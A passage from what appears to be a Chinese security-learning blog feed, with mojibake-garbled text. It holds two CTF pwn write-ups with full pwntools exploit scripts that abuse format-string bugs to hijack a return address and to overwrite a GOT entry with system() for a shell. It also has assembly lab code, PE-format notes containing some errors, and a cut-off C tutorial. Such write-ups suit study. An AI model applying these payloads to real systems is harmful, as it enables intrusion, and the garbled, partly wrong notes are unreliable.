        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20214320.png" alt="å±å¹•æˆªå›¾ 2023-05-25 214320"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20214350.png" alt="å±å¹•æˆªå›¾ 2023-05-25 214350"></p><p>IDAè¿›ç¨‹åºçœ‹ä¸‹ï¼Œå‘ç°printf(s)å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¸”ç¬¬ä¸€æ¬¡fgetsè¾“å…¥å­—ç¬¦1ä¼šæ‰§è¡Œclose_bordersï¼Œå…¶å®æ‰§è¡Œno_panicä¹ŸåŒç†ï¼Œæ–¹ä¾¿èµ·è§åªæ¼”ç¤ºä¸‹close_borders</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215106.png" alt="å±å¹•æˆªå›¾ 2023-05-25 215106"></p><p>checksecä¸‹,relroä¿æŠ¤å…¨å¼€ï¼Œgotè¡¨åœ°å€æ”¹ä¸äº†ï¼Œpieä¹Ÿæ‰“å¼€äº†ï¼Œåœ°å€æ˜¯éšæœºçš„ã€‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215525.png" alt="å±å¹•æˆªå›¾ 2023-05-25 215525"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20215559.png" alt="å±å¹•æˆªå›¾ 2023-05-25 215559"></p><p>åœ¨idaé‡Œä»”ç»†æ‰¾æ‰¾ï¼Œå‘ç°é¢˜ç›®ç»™äº†win()å‡½æ•°ï¼Œä½†pieæ˜¯æ‰“å¼€çš„ï¼Œidaé‡Œæ˜¾ç¤ºçš„æ˜¯åç§»åœ°å€</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20220602.png" alt="å±å¹•æˆªå›¾ 2023-05-25 220602"></p><p>gdbè°ƒè¯•ä¸‹ï¼Œè¾“å…¥çš„å€¼æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20220814.png" alt="å±å¹•æˆªå›¾ 2023-05-25 220814"></p><p>rbpæ˜¯ç¬¬14ä¸ªå‚æ•°ï¼Œè¿”å›åœ°å€æ˜¯ç¬¬15ä¸ªå‚æ•°ï¼Œrbpçš„å€¼ä¸æ ˆä¸Šå‚¨å­˜è¿”å›åœ°å€çš„åœ°å€åç§»ä¸º0x8</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20221639.png" alt="å±å¹•æˆªå›¾ 2023-05-25 221639"></p><p>å¾—åˆ°åŸºå€0x555555554000</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-25%20221657.png" alt="å±å¹•æˆªå›¾ 2023-05-25 221657"></p><p>åŸºå€+åç§»ï¼Œå¾—åˆ°winå‡½æ•°çš„çœŸå®åœ°å€ï¼Œè®¡ç®—å…¶ä¸è¿”å›åœ°å€çš„åç§»ï¼ˆåç§»æ˜¯å›ºå®šçš„ï¼‰ï¼Œå³0x55555555484-0x555555555165&#x3D;0x31f</p><p>ç¡®å®šä¸‹æ€è·¯ï¼Œå…ˆç”¨ç¬¬1ä¸ªprintfæ³„éœ²å‡ºrbp,è¿”å›åœ°å€çš„å€¼ï¼Œrbpçš„å€¼-0x8å¾—åˆ°å‚¨å­˜è¿”å›åœ°å€çš„çœŸå®åœ°å€ï¼Œè¿”å›åœ°å€çš„å€¼-0x31få¾—åˆ°winå‡½æ•°çš„çœŸå®åœ°å€ã€‚å†é€šè¿‡ç¬¬2ä¸ªprintfå°†å‚¨å­˜è¿”å›åœ°å€çš„çœŸå®åœ°å€å†™å…¥ï¼Œä¿®æ”¹ä¸ºwinå‡½æ•°çš„åœ°å€å³å¯ã€‚æ³¨æ„ï¼Œç¬¬äºŒæ¬¡å†™å…¥å‚¨å­˜è¿”å›åœ°å€çš„çœŸå®åœ°å€æ—¶ï¼Œå­˜åœ¨\x00æˆªæ–­(å› ä¸º64ä½çš„åœ°å€æœ€å¤šä½¿ç”¨12ä½)ï¼Œè¦å°†è¿”å›åœ°å€æ”¾åˆ°payloadæœ«å°¾ã€‚æœ€åæ¥æ”¶flagä¹‹åä¸€å®šè¦è¿›äº¤äº’ï¼Œå¦åˆ™ç¨‹åºä¸ä¼šåœ¨ç»ˆç«¯ï¼ˆå³å±å¹•ï¼‰ä¸Šæ˜¾ç¤ºæ¥æ”¶åˆ°çš„å­—ç¬¦ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><blockquote><p>from pwn import *</p><p>context(log_level&#x3D;â€™debugâ€™)</p><p>p&#x3D;process(â€˜.&#x2F;coronacationâ€™)</p><p>p.recv()</p><p>offset&#x3D;0x8</p><p>win_offset&#x3D;0x31f</p><p>payload1&#x3D;str(1).encode(â€˜utf-8â€™)+bâ€™%14$p.â€™+bâ€™%15$p.â€™</p><p>p.sendline(payload1)</p><p>p.recvuntil(bâ€™chose: 1â€™)</p><p>rbp&#x3D;int(p.recvuntil(bâ€™.â€™,drop&#x3D;True),16)</p><p>ret&#x3D;int(p.recvuntil(bâ€™.â€™,drop&#x3D;True),16)</p><p>print(hex(rbp))</p><p>print(hex(ret))</p><p>stack_ret&#x3D;rbp-offset</p><p>win_addr&#x3D;ret-win_offset</p><p>print(hex(stack_ret))</p><p>p.recv()</p><p>payload2&#x3D;bâ€™%â€™+str((win_addr&amp;0xffff)).encode(â€˜utf-8â€™)+bâ€™câ€™+bâ€™%8$hnâ€™</p><p>payload2&#x3D;payload2.ljust(16,bâ€™aâ€™)</p><p>payload2+&#x3D;p64(stack_ret)</p><p>p.sendline(payload2)</p><p>p.recvuntil(bâ€™}â€™)</p><p>p.interactive()</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²:æ›´æ”¹gotè¡¨</title>
      <link href="/posts/58637/"/>
      <url>/posts/58637/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20201417.png"></p><p>å‰ä¸¤è¡Œmemsetå°†s,formatä¸­çš„å€¼å…¨éƒ¨ç½®ä¸º0,sprintfå‡½æ•°å°†sä¸­çš„å€¼ä¸Repeater:æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²åå­˜æ”¾åœ¨formatä¸­ã€‚printf(format)å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20202356.png"></p><p>checksecä¸‹,relroä¿æŠ¤åŠå¼€,å¯ä»¥æ›´æ”¹gotè¡¨ã€‚</p><blockquote><p>å½“RELROä¿æŠ¤ä¸ºNO RELROçš„æ—¶å€™ï¼Œinit.arrayã€fini.arrayã€got.pltå‡å¯è¯»å¯å†™ï¼›ä¸ºPARTIAL RELROçš„æ—¶å€™ï¼Œini.arrayã€fini.arrayå¯è¯»ä¸å¯å†™ï¼Œgot.pltå¯è¯»å¯å†™ï¼›ä¸ºFULL RELROæ—¶ï¼Œinit.arrayã€fini.arrayã€got.pltå‡å¯è¯»ä¸å¯å†™ã€‚</p></blockquote><p>gdbä¸‹ï¼Œç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20204247.png"></p><p>å‘ç°æœ‰ä¸¤ä¸ªåœ°æ–¹å­˜æ”¾ç€aaaaaaaaï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿçœ‹ä¸€çœ¼idaï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²å…ˆå­˜æ”¾åœ¨sä¸­ï¼Œç„¶åä¸Repeater:æ‹¼æ¥å­˜å…¥formatã€‚ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬é€‰ç”¨ä¸Šé¢çš„ä½œä¸ºå‚æ•°ã€‚è®¡ç®—ä¸‹åç§»</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20205513.png"></p><p>ç¡®å®šä¸‹æ€è·¯ï¼Œæ›´æ”¹strlençš„gotè¡¨åœ°å€ä¸ºsystemçš„åœ°å€ï¼Œä¸‹ä¸€æ¬¡å¾ªç¯å†å‘é€&#x2F;bin&#x2F;shå®Œæˆè°ƒç”¨ã€‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-05-21%20211908.png"></p><p>é¦–å…ˆéœ€è¦æ³„éœ²å‡ºsystemçš„çœŸå®åœ°å€,æˆ‘ä»¬åœ¨æ ˆä¸Šæ‰¾å‡ºäº†ï¼ˆ__libc_start_main+245ï¼‰çš„åç§»ï¼Œé€šè¿‡%151$sæ³„éœ²å‡ºï¼ˆlibc_start_main+245ï¼‰çš„çœŸå®åœ°å€å†å‡å»245å¾—åˆ°libc_start_mainçš„çœŸå®åœ°å€ï¼Œç»§è€Œå¾—åˆ°åŸºå€ï¼Œæœ€ç»ˆè·å¾—systemçš„çœŸå®åœ°å€ï¼Œå³ï¼š</p><blockquote><p>libc_addr&#x3D;int(p.recv(8),16)-245</p><p>libc&#x3D;ELF(â€˜&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6â€™)<br>libcbase&#x3D;libc_addr-libc.symbols[â€˜__libc_start_mainâ€™]</p><p>sys_addr&#x3D;libcbase+libc.symbols[â€˜systemâ€™]</p></blockquote><p>ä¿®æ”¹gotè¡¨æ—¶éœ€è¦æ³¨æ„ä½¿ç”¨hnè€Œä¸æ˜¯nï¼Œä¸€æ¬¡ä¿®æ”¹4ä¸ªå­—èŠ‚çš„è¯ç¨‹åºä¼šå´©æºƒï¼Œé¦–å…ˆ(sys_addr&amp;0xffff)-9å–å‡ºsystemå‡½æ•°çš„ä½å…«ä½ï¼Œ-9æ˜¯å› ä¸ºprintf(format)è¾“å‡ºäº†Repeater:è¿™9ä¸ªå­—ç¬¦ã€‚ç„¶å((sys_addr&gt;&gt;16)&amp;0xffff)-(sys_addr&amp;0xffff)å–å‡ºé«˜ä¸¤ä½çš„å­—èŠ‚</p><p>expå¦‚ä¸‹ï¼š</p><blockquote><p>from pwn import *<br>p&#x3D;process(â€˜.&#x2F;axbfmtâ€™)<br>elf&#x3D;ELF(â€˜.&#x2F;axbfmtâ€™)<br>libc&#x3D;ELF(â€˜&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6â€™)<br>p.recv()<br>payload1&#x3D;bâ€™%151$pâ€™<br>p.sendline(payload1)<br>p.recvuntil(bâ€™0xâ€™)<br>libc_addr&#x3D;int(p.recv(8),16)-245<br>libcbase&#x3D;libc_addr-libc.symbols[â€˜__libc_start_mainâ€™]<br>print(hex(libcbase))<br>sys_addr&#x3D;libcbase+libc.symbols[â€˜systemâ€™]<br>print(hex(sys_addr))<br>payload&#x3D;bâ€™%â€™+str((sys_addr&amp;0xffff)-9).encode(â€˜utf-8â€™) +bâ€™c%20$hnâ€™<br>payload+&#x3D;bâ€™%â€™+str(((sys_addr&gt;&gt;16)&amp;0xffff)-(sys_addr&amp;0xffff)).encode(â€˜utf-8â€™)+bâ€™c%21$hnâ€™<br>payload &#x3D; payload.ljust(0x31,bâ€™aâ€™)<br>payload+&#x3D;p32(elf.got[â€˜strlenâ€™])+p32(elf.got[â€˜strlenâ€™]+2)<br>p.sendlineafter(bâ€Please tell me:â€,payload)<br>p.recv()<br>p.sendline(bâ€™;&#x2F;bin&#x2F;sh\x00â€™)<br>print(hex((sys_addr&amp;0xffff)-9))<br>print(hex((sys_addr&gt;&gt;16)&amp;0xffff))</p><p>p.interactive()</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒ6:å°†dataæ®µä¸­æ¯ä¸€ä¸ªå•è¯çš„å‰4ä¸ªå­—æ¯æ”¹ä¸ºå¤§å†™å­—æ¯</title>
      <link href="/posts/43171/"/>
      <url>/posts/43171/</url>
      
        <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code,<span class="built_in">ss</span>:stack,<span class="built_in">ds</span>:data</span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line"><span class="built_in">dw</span> <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">stack ends</span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;1. display      &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;2. brows        &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;3. replace      &#x27;</span></span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;4. modify       &#x27;</span></span><br><span class="line">data ends</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span> <span class="keyword">mov</span> <span class="built_in">ax</span>,stack</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">4</span></span><br><span class="line"><span class="symbol">s0:</span> <span class="keyword">push</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">4</span></span><br><span class="line"><span class="symbol">s:</span> <span class="keyword">mov</span> <span class="built_in">al</span>,[<span class="built_in">bx</span>+<span class="number">3</span>+<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">al</span>,<span class="number">11011111b</span></span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>+<span class="number">3</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">add</span> <span class="built_in">bx</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">loop</span> s0</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒ4:[bx]å’Œloopçš„ä½¿ç”¨</title>
      <link href="/posts/29968/"/>
      <url>/posts/29968/</url>
      
        <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ç¼–ç¨‹,å‘å†…å­˜ <span class="number">0</span>:<span class="number">200</span>è‡³<span class="number">0</span>:23f ä¾æ¬¡ä¼ é€æ•°æ® <span class="number">0</span>è‡³<span class="number">63</span>(<span class="number">3fh</span>)</span><br><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="number">64</span></span><br><span class="line"><span class="symbol">s:</span> <span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">bx</span>],<span class="built_in">bl</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">loop</span> s</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¨‹åºåŸºç¡€æ¦‚å¿µ</title>
      <link href="/posts/18301/"/>
      <url>/posts/18301/</url>
      
        <content type="html"><![CDATA[<p>1.a.cé¢„å¤„ç†ä¸ºa.iç¼–è¯‘ä¸ºa.sæ±‡ç¼–ä¸ºa.oé“¾æ¥ä¸ºa.exeã€‚</p><p>2.è¿›ç¨‹æ˜¯åŠ¨æ€çš„ï¼Œæœ‰ç”Ÿå‘½å‘¨æœŸï¼ŒåŠ¨æ€ç”Ÿæˆï¼ŒåŠ¨æ€æ¶ˆäº¡ã€‚ç¨‹åºæ˜¯é™æ€çš„ï¼Œæ˜¯æŒ‡ä»¤ä¸ä»£ç çš„é›†åˆã€‚ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œè¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œçº¿ç¨‹æ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚</p><p>3.windowsä¸­.exe .dll .syså‡ä¸ºpeæ ¼å¼ï¼ŒLinuxä¸­.elfä¸ºpeæ ¼å¼.</p><p>4.eopä¸ºç¨‹åºçš„å…¥å£ç‚¹ï¼Œoepä¸ºåŸå…¥å£ç‚¹ã€‚ç¨‹åºå¯èƒ½å¥—å£³ï¼Œå£³çš„å…¥å£ç‚¹ä¸ºeopã€‚å£³è¿è¡Œæ—¶è¿˜ä¼šåˆ°åŸå…¥å£ç‚¹æ‰§è¡Œï¼Œç§°åŸå…¥å£ç‚¹ä¸ºoepã€‚imagebaseä¸ºå†…å­˜åŸºåœ°å€ï¼Œé»˜è®¤ä¸º0x000000ã€‚VAä¸ºpeæ–‡ä»¶åœ¨å†…å­˜çš„è™šæ‹Ÿåœ°å€ã€‚RVAæ˜¯ç›¸å¯¹äºimagebaseçš„è™šæ‹Ÿåœ°å€ã€‚RVA&#x3D;VA-imagebaseã€‚VOFFSETæ˜¯peæ–‡ä»¶èŠ‚çš„èµ·å§‹åœ°å€ç›¸å¯¹äºimagebaseçš„åç§»(å†…å­˜ä¸­ç›¸å¯¹äºimagebaseçš„åç§»)ã€‚Roffsetç›¸å¯¹äºæ–‡ä»¶åœ¨ç£ç›˜é¦–åœ°å€çš„åç§»ã€‚Voffset(å†…å­˜)&#x3D;èŠ‚çš„èµ·å§‹åœ°å€(è™šæ‹Ÿåœ°å€)-imagebaseåœ°å€ã€‚Roffset(ç£ç›˜)&#x3D;èŠ‚çš„èµ·å§‹åœ°å€-æ–‡ä»¶çš„é¦–åœ°å€(ç£ç›˜)</p><p>PEæ–‡ä»¶æ˜¯ä¸€ç§Windowså¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼ŒåŒ…å«äº†ç¨‹åºä»£ç ã€æ•°æ®å’Œèµ„æºç­‰ä¿¡æ¯ã€‚åœ¨PEæ–‡ä»¶ä¸­ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ç›¸å…³æ¦‚å¿µï¼š</p><ul><li>VAï¼ˆVirtual Addressï¼‰ï¼šè™šæ‹Ÿåœ°å€ï¼Œæ˜¯ç¨‹åºåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚VAæ˜¯ç›¸å¯¹äºè¿›ç¨‹çš„åŸºåœ°å€ï¼ˆImage Baseï¼‰çš„åç§»é‡ï¼Œè¿›ç¨‹çš„åŸºåœ°å€ç”±æ“ä½œç³»ç»Ÿå†³å®šã€‚åœ¨å†…å­˜ä¸­ï¼Œç¨‹åºçš„ä»£ç å’Œæ•°æ®è¢«æ˜ å°„åˆ°VAæŒ‡å‘çš„åœ°å€ç©ºé—´ä¸­ã€‚</li><li>RVAï¼ˆRelative Virtual Addressï¼‰ï¼šç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼Œæ˜¯ç›¸å¯¹äºæ¨¡å—åŸºåœ°å€ï¼ˆModule Baseï¼‰çš„åç§»é‡ï¼Œæ¨¡å—åŸºåœ°å€æ˜¯PEæ–‡ä»¶åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ã€‚RVAé€šå¸¸ç”¨äºæè¿°PEæ–‡ä»¶ä¸­å„ç§æ•°æ®ç»“æ„çš„åœ°å€ï¼Œå¦‚PEå¤´ã€èŠ‚è¡¨ã€å¯¼å…¥è¡¨ã€å¯¼å‡ºè¡¨ç­‰ã€‚</li><li>Voffsetï¼šè™šæ‹Ÿåç§»é‡ï¼Œæ˜¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€ç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»é‡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªVAä¸º0x4000çš„ä»£ç æ®µåœ¨PEæ–‡ä»¶ä¸­çš„åç§»é‡ä¸ºVoffset &#x3D; 0x4000 - Image Baseã€‚</li><li>Roffsetï¼šç›¸å¯¹åç§»é‡ï¼Œæ˜¯ä¸€ä¸ªRVAç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»é‡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªRVAä¸º0x1000çš„ä»£ç æ®µåœ¨PEæ–‡ä»¶ä¸­çš„åç§»é‡ä¸ºRoffset &#x3D; 0x1000ã€‚</li></ul><p>æ€»çš„æ¥è¯´ï¼ŒVAå’ŒRVAæ˜¯æè¿°ç¨‹åºåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œè€ŒVoffsetå’ŒRoffsetæ˜¯æè¿°ç¨‹åºåœ¨PEæ–‡ä»¶ä¸­çš„ä½ç½®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºä¸åŒçš„PEæ–‡ä»¶ï¼ŒImage Baseå’Œæ¨¡å—åŸºåœ°å€å¯èƒ½ä¸åŒï¼Œå› æ­¤VAå’ŒRVAä¹Ÿä¼šä¸åŒã€‚</p><p>5.VAå¯¹åº”çš„æ–‡ä»¶åç§»é‡ï¼ˆOffsetï¼‰</p><p>Offset &#x3D; VA - ImageBase + ROffset </p><p>Offset &#x3D; 0x00049586 - 0x00040000 + 0x00000540 </p><p>Offset &#x3D; 0x00009526</p><p>.textæ®µçš„èµ·å§‹åœ°å€ &#x3D; ImageBase + ROffset - VOffset</p><p>.textæ®µçš„èµ·å§‹åœ°å€ &#x3D; 0x00040000 + 0x00000540 - 0x0000540 </p><p>.textæ®µçš„èµ·å§‹åœ°å€ &#x3D; 0x00040000</p><p>å› æ­¤ï¼Œè¯¥VAå¯¹åº”çš„æ–‡ä»¶åœ°å€ä¸ºï¼š.textæ®µçš„èµ·å§‹åœ°å€ + Offsetï¼Œå³ï¼š</p><p>FileAddress &#x3D; .textæ®µçš„èµ·å§‹åœ°å€ + Offset </p><p>FileAddress &#x3D; 0x0000540 + 0x00009526 </p><p>FileAddress &#x3D; 0x0000E066</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Helloworld</title>
      <link href="/posts/42962/"/>
      <url>/posts/42962/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-worldçš„ä»£ç åŠæ³¨é‡Š"><a href="#hello-worldçš„ä»£ç åŠæ³¨é‡Š" class="headerlink" title="hello worldçš„ä»£ç åŠæ³¨é‡Š"></a>hello worldçš„ä»£ç åŠæ³¨é‡Š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* this is the first c program */ #æ³¨é‡Š</span><br><span class="line">include &lt;stdio.h&gt; #å¤´æ–‡ä»¶</span><br><span class="line">int main(void) #mainå‡½æ•°(è¿”å›å€¼,å‡½æ•°å,å‚æ•°)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello world&quot;); #æ‰“å°</span><br><span class="line">    return 0; #è¿”å›è¯­å¥</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¼–å†™-ç¼–è¯‘-è¿è¡Œ-è°ƒè¯•"><a href="#ç¼–å†™-ç¼–è¯‘-è¿è¡Œ-è°ƒè¯•" class="headerlink" title="ç¼–å†™,ç¼–è¯‘,è¿è¡Œ,è°ƒè¯•"></a>ç¼–å†™,ç¼–è¯‘,è¿è¡Œ,è°ƒè¯•</h2><ul><li>debug <ul><li>ä¾¿äºä¸€æ­¥æ­¥è°ƒè¯•</li></ul></li><li>release<ul><li>æ›´ç²¾ç®€</li></ul></li><li>x86<ul><li>32ä½</li><li>å¤„ç†å™¨,å¯„å­˜å™¨å¤„ç†4ä¸ªå­—èŠ‚</li><li>å†…å­˜å¯»å€32ä½</li></ul></li><li>x64<ul><li>64ä½</li><li>å¤„ç†å™¨ï¼Œå¯„å­˜å™¨å¤„ç†8ä¸ªå­—èŠ‚</li><li>å†…å­˜å¯»å€64ä½</li></ul></li><li>.cppä¸.cçš„åŒºåˆ«<ul><li>cppè¯­æ³•æ›´ä¸ºä¸¥æ ¼</li><li>cppå¯ä»¥åœ¨åå®šä¹‰å˜é‡</li></ul></li></ul><h2 id="Linuxç¼–å†™-ç¼–è¯‘-è¿è¡Œ-è°ƒè¯•"><a href="#Linuxç¼–å†™-ç¼–è¯‘-è¿è¡Œ-è°ƒè¯•" class="headerlink" title="Linuxç¼–å†™,ç¼–è¯‘,è¿è¡Œ,è°ƒè¯•"></a>Linuxç¼–å†™,ç¼–è¯‘,è¿è¡Œ,è°ƒè¯•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim hello.c</span><br><span class="line">gcc hello.c -o hello #ç¼–è¯‘</span><br><span class="line">gdb hello.c -o hello_g -g  #ç¼–è¯‘ä¸ºdebugç‰ˆæœ¬</span><br><span class="line">gdb hello_g #æ‰“å¼€</span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›å¸¸ç”¨gdbå‘½ä»¤"><a href="#ä¸€äº›å¸¸ç”¨gdbå‘½ä»¤" class="headerlink" title="ä¸€äº›å¸¸ç”¨gdbå‘½ä»¤"></a>ä¸€äº›å¸¸ç”¨gdbå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 